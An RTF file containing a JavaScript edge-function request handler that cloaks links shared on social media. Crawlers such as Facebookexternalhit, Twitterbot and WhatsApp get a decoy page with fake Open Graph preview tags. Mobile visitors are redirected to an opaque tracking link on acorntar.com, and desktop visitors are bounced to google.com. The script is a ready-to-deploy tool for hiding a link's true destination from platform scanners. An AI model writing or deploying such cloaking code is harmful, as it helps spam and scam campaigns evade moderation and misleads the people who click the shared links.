{\rtf1\ansi\ansicpg1252\deff0\deflang1033{\fonttbl{\f0\fnil\fcharset0 Calibri;}{\f1\fnil Segoe UI Symbol;}}
{\*\generator Msftedit 5.41.21.2510;}\viewkind4\uc1\pard\sa200\sl276\slmult1\lang9\f0\fs22 export async function onRequest(context) \{\par
  const request = context.request;\par
  const userAgent = request.headers.get('user-agent') || '';\par
\par
  // 1. Check for Social Media Crawlers / Bots\par
  const isSocialBot = /facebookexternalhit|Facebot|Twitterbot|Pinterest|LinkedInBot|WhatsApp|TelegramBot/i.test(userAgent);\par
\par
  if (isSocialBot) \{\par
    const htmlContent = `<!DOCTYPE html>\par
<html lang="en">\par
<head>\par
    <meta charset="UTF-8">\par
    <meta name="viewport" content="width=device-width, initial-scale=1.0">\par
    <meta property="og:t" content="\lang1033\f1\u-10179?\u-8691?\u-10180?\u-8281?\u-10180?\u-8276?\f0 />\par
    <meta property="og:description" content="">\par
    <meta property="og:image" content="https://5dohuaa2jk.ucarecd.net/c06e316f-7d1c-440c-873d-08f2c8f8c8e2/3.jpg">\par
    <meta property="og:url" content="https://www.google.com">\par
    <meta property="og:type" content="website">\par
</head>\par
<body>\par
</body>\par
</html>`;\par
\par
    return new Response(htmlContent, \{\par
      headers: \{ 'content-type': 'text/html;charset=UTF-8' \},\par
    \});\par
  \}\par
\par
  // 2. Check for Mobile Users\par
  const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);\par
\par
  if (isMobile) \{\par
    return Response.redirect("\lang9 https://acorntar.com/mxxcdagb?key=e6e8236c6980d94ca8e81d0b03ea93df\lang1033 ", 302);\par
  \} else \{\par
    return Response.redirect("https://www.google.com", 302);\par
  \}\par
\}\lang9\par
}
 
